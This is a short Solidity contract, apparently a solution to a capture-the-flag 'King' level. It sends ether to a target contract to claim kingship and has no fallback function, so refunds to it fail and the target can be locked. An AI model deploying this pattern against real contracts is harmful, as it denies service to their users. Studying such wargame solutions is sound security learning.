// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingSol {
    function attack(address kingContract) external payable {
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "call failed");
    }
}
